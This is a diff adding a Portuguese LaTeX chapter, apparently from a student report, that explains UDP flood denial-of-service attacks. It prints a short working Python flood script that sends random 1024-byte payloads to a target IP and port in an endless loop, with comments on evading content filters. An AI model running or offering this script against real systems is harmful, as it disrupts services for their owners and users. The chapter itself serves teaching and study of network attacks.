@@ -1,0 +1,31 @@
+\chapter{Negação de Serviço UDP: 2-UDPFlood}
+\label{cap3}
+
+\section{Fundamentação Teórica: Inundação de Largura de Banda}
+A negação de serviço (DoS) via UDP Flood explora a natureza \textit{stateless} (sem estado) do protocolo UDP. Ao contrário do TCP, o UDP não exige confirmação de receção. Isto permite que um atacante envie pacotes a uma velocidade muito superior à que o servidor consegue processar ou que a largura de banda da rede suporta. Quando o servidor recebe um pacote num porto fechado, ele tenta responder com um pacote ICMP "Unreachable", consumindo ainda mais recursos de CPU e tráfego de saída.
+
+\section{Implementação e Geração de Entropia}
+O script \texttt{2-UDPFlood.py} foca-se no volume de tráfego. Para maximizar a eficácia do ataque e evitar deteção por filtros simples de pacotes idênticos, a implementação utiliza dados aleatórios.
+
+\section{Análise Detalhada do Código}
+
+O código utiliza a biblioteca \texttt{os} para garantir que a carga útil (\textit{payload}) seja imprevisível:
+
+\begin{lstlisting}[caption={Geração de Carga Útil e Envio Massivo}]
+import socket
+import os
+
+# Definimos o socket como DGRAM, indicando o protocolo UDP.
+client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+# Geramos 1024 bytes de lixo aleatório (payload). 
+# Isto aumenta a entropia e dificulta a filtragem por assinatura de conteúdo.
+data = os.urandom(1024)
+
+while True:
+    # O loop infinito garante o débito máximo da interface de rede.
+    # O ataque é direcionado ao IP e Porto especificados nas instruções.
+    client.sendto(data, (target_ip, target_port))
+\end{lstlisting}
+
+Este módulo atende diretamente ao requisito 1.2, demonstrando como uma linguagem dinâmica como o Python pode ser usada para gerar tráfego de rede agressivo com poucas linhas de código.
